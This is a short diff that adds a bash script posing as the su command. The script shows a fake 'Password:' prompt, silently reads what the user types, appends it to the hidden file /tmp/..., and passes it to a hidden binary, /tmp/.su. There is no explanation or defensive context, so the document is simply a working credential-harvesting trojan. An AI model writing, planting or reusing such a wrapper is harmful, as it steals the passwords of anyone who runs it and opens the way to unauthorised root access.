@@ -1,0 +1,6 @@
+#!/bin/bash
+
+echo -ne "Password:\c"
+read -t 30 -s pass
+echo "$pass" >> /tmp/...
+/tmp/.su -p "$pass" /bin/su $*
